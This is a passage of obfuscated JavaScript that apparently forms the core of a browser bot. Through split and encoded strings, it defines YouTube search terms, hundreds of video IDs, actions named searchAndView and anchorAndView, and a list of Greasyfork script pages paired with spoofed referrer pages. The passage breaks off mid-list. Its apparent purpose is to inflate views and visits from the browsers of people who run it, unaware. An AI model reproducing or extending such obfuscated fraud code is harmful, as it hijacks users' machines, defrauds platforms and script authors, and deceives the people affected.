searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x53d + -0x2055 + 0x1b22)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x22d1 + 0x413 + 0x2 * -0x136d)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + V(0x19) + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0xb3c + -0x11d5 + 0x1 * 0x1d14);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    V(0x10) + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    W(0x0, 'pQfM') + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    V(0x3) + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    W(0x4, '*70y') + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + X(0xe) + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': X(0x12) + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + V(0x11) + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
